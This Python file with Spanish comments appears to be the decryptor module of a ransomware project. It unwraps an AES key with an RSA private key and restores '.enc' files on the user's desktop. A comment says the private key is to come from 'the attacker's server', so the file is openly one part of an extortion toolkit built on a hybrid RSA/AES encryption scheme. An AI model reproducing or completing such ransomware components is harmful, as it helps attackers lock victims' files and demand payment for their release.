import os
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Util.Padding import unpad
from find_files import recorrer_directorio  # Usamos la función de find_files.py

def cargar_clave_privada(): #tiene que llegar a través de una petición al servidor del atacante. 
    """
    Carga la clave privada RSA desde el archivo rsa_private.pem.
    """
    ruta_clave_privada = os.path.abspath("rsa_private.pem")
    print(f"Buscando clave privada en: {ruta_clave_privada}")  # Depuración

    if os.path.exists(ruta_clave_privada):
        with open(ruta_clave_privada, "rb") as clave_file:
            return RSA.import_key(clave_file.read())
    else:
        raise FileNotFoundError(f"El archivo de clave privada no se encuentra en: {ruta_clave_privada}")

def cargar_clave_aes_cifrada():
    """
    Carga la clave AES cifrada desde el archivo aes_key_encrypted.bin.
    """
    ruta_clave_aes = os.path.abspath("aes_key_encrypted.bin")
    print(f"Buscando clave AES cifrada en: {ruta_clave_aes}")  # Depuración

    if os.path.exists(ruta_clave_aes):
        with open(ruta_clave_aes, "rb") as clave_file:
            return clave_file.read()
    else:
        raise FileNotFoundError(f"El archivo de clave AES cifrada no se encuentra en: {ruta_clave_aes}")

def descifrar_clave_aes(clave_privada, clave_aes_cifrada):
    """
    Descifra la clave AES usando la clave privada RSA.
    """
    cipher_rsa = PKCS1_OAEP.new(clave_privada)
    return cipher_rsa.decrypt(clave_aes_cifrada)

def descifrar_archivo(archivo, clave):
    """
    Descifra un archivo utilizando AES en modo CBC y sobrescribe el archivo con la versión descifrada.
    """
    with open(archivo, "rb") as f:
        iv_y_datos_cifrados = f.read()
    
    iv = iv_y_datos_cifrados[:16]  # El IV ocupa los primeros 16 bytes
    datos_cifrados = iv_y_datos_cifrados[16:]
    
    cipher = AES.new(clave, AES.MODE_CBC, iv)
    datos_descifrados = unpad(cipher.decrypt(datos_cifrados), AES.block_size)
    
    with open(archivo, "wb") as f:
        f.write(datos_descifrados)  # Sobrescribimos el archivo con los datos descifrados

def descifrar_archivos():
    """
    Descifra todos los archivos importantes en el directorio y subdirectorios con extensión '.enc'.
    """
    directorio_base = os.path.expanduser("~/Desktop/Files")
    archivos = recorrer_directorio() 

    if not archivos:
        print("No se encontraron archivos importantes.")
        return

    # Cargar la clave privada y la clave AES cifrada
    clave_privada = cargar_clave_privada()
    clave_aes_cifrada = cargar_clave_aes_cifrada()

    # Descifra la clave AES con la clave privada RSA
    clave_aes = descifrar_clave_aes(clave_privada, clave_aes_cifrada)
    print("Clave AES descifrada correctamente.")

    # Descifra los archivos con extensión '.enc'
    for archivo in archivos:
        if archivo.endswith(".enc"):  # Verifica si el archivo tiene la extensión '.enc'
            ruta_completa = os.path.join(directorio_base, archivo)
            if os.path.isfile(ruta_completa):
                # Descifra el archivo
                descifrar_archivo(ruta_completa, clave_aes)
                # Renombrar el archivo eliminando la extensión '.enc'
                nueva_ruta = ruta_completa[:-4]  # Elimina la extensión '.enc'
                os.rename(ruta_completa, nueva_ruta)
                print(f"Archivo descifrado y renombrado: {ruta_completa} -> {nueva_ruta}")

    print("Archivos descifrados correctamente.")

if __name__ == "__main__":
    descifrar_archivos()
